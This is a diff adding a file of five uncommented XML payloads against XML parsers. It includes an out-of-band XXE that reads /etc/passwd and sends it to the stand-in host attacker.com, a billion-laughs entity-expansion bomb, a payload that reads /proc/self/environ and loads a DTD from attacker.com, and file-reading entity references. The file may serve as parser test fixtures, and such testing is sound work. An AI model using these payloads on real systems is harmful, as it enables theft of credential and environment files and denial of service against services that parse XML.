@@ -1,0 +1,70 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?%xxe;'>">
+  %eval;
+]>
+<root>&exfiltrate;</root>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE doc [
+  <!ELEMENT doc (item*)>
+  <!ELEMENT item (#PCDATA)>
+  <!ATTLIST item id ID #REQUIRED>
+  <!ENTITY lob "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx">
+]>
+<doc>
+  <item id="x1">&lob;&lob;&lob;&lob;</item>
+  <item id="x2">&lob;&lob;&lob;&lob;&lob;&lob;</item>
+</doc>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE bomb [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<bomb>&lol4;</bomb>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE html [
+  <!ENTITY % file SYSTEM "file:///proc/self/environ">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<html>
+  <body>
+    <p>Content here</p>
+  </body>
+</html>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE config [
+  <!ELEMENT config (setting+)>
+  <!ELEMENT setting (key, value)>
+  <!ELEMENT key (#PCDATA)>
+  <!ELEMENT value (#PCDATA)>
+  <!ENTITY % internal SYSTEM "file:///etc/hosts">
+  <!ENTITY % remote SYSTEM "http://localhost:8080/schema.xml">
+]>
+<config>
+  <setting>
+    <key>timeout</key>
+    <value>&internal;</value>
+  </setting>
+  <setting>
+    <key>endpoint</key>
+    <value>&remote;</value>
+  </setting>
+</config>
+```
